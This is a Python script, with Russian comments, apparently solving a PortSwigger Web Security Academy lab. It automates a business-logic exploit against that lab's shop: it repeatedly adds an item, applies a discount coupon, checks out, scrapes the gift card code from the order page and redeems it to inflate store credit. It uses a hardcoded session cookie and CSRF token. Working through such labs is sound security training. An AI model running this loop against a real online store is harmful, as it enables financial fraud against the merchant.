import requests
import sys

from bs4 import BeautifulSoup

# Отключаем предупреждения о SSL (если нужно)
requests.packages.urllib3.disable_warnings()

# Базовый URL
base_url = "https://0a0500de03eeded8818093c300c5001f.web-security-academy.net"

# Общие заголовки
common_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}

# Куки
cookies = {
    "session": "KtfRVQ8BbG68ltw7P7VvKniP74gFh7M7"
}

# CSRF токен
csrf_token = "A1n7CuVmCS8cEiodklc2jFqWHrsUxnvK"
for i in range(300):
    try:
        print("=" * 80)
        print("Запрос 1: Добавление товара в корзину")
        print("=" * 80)
        
        # Запрос 1: POST /cart
        url1 = f"{base_url}/cart"
        headers1 = common_headers.copy()
        headers1.update({
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "36",
            "Origin": base_url,
            "Referer": f"{base_url}/product?productId=2"
        })
        
        data1 = "productId=2&redir=PRODUCT&quantity=1"
        
        response1 = requests.post(
            url1,
            headers=headers1,
            cookies=cookies,
            data=data1,
            verify=False,
            allow_redirects=True
        )
        
        print(f"Статус код: {response1.status_code}")
        print(f"URL: {response1.url}")
        print(f"Размер ответа: {len(response1.content)} байт")
        print()
        
        print("=" * 80)
        print("Запрос 2: Применение купона")
        print("=" * 80)
        
        # Запрос 2: POST /cart/coupon
        url2 = f"{base_url}/cart/coupon"
        headers2 = common_headers.copy()
        headers2.update({
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "53",
            "Origin": base_url,
            "Referer": f"{base_url}/cart"
        })
        
        data2 = f"csrf={csrf_token}&coupon=SIGNUP30"
        
        response2 = requests.post(
            url2,
            headers=headers2,
            cookies=cookies,
            data=data2,
            verify=False,
            allow_redirects=True
        )
        
        print(f"Статус код: {response2.status_code}")
        print(f"URL: {response2.url}")
        print(f"Размер ответа: {len(response2.content)} байт")
        print()
        
        print("=" * 80)
        print("Запрос 3: Оформление заказа")
        print("=" * 80)
        
        # Запрос 3: POST /cart/checkout
        url3 = f"{base_url}/cart/checkout"
        headers3 = common_headers.copy()
        headers3.update({
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "37",
            "Origin": base_url,
            "Referer": f"{base_url}/cart"
        })
        
        data3 = f"csrf={csrf_token}"
        
        response3 = requests.post(
            url3,
            headers=headers3,
            cookies=cookies,
            data=data3,
            verify=False,
            allow_redirects=True
        )
        
        print(f"Статус код: {response3.status_code}")
        
        print("=" * 80)
        
        
       # Парсим HTML с помощью BeautifulSoup
        soup = BeautifulSoup(response3.text, 'html.parser')
        
        # Находим первую таблицу с классом 'is-table-numbers'
        table = soup.find('table', class_='is-table-numbers')
        
        if table:
            # Находим первый элемент td в этой таблице
            first_td = table.find('td')
            
            if first_td:
                code = first_td.text.strip()
                print(f"\nНайденный код: {code}")

                url4 = f"{base_url}/gift-card"
                headers4 = common_headers.copy()
                headers4.update({
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "58",
                    "Origin": base_url,
                    "Referer": f"{base_url}/my-account"
                })
                
                data4 = f"csrf={csrf_token}&gift-card={code}"
                
                response4 = requests.post(
                    url4,
                    headers=headers4,
                    cookies=cookies,
                    data=data4,
                    verify=False,
                    allow_redirects=True
                )
                
                print(f"Статус код: {response4.status_code}")
                print(f"URL: {response4.url}")
                print(f"Размер ответа: {len(response4.content)} байт")
                
            else:
                print("\nНе найден элемент <td> в таблице")
        else:
            print("\nНе найдена таблица с классом 'is-table-numbers'")
            
        print("=" * 80)

    except requests.exceptions.RequestException as e:
        print(f"Ошибка при выполнении запроса: {e}")
        sys.exit(1)
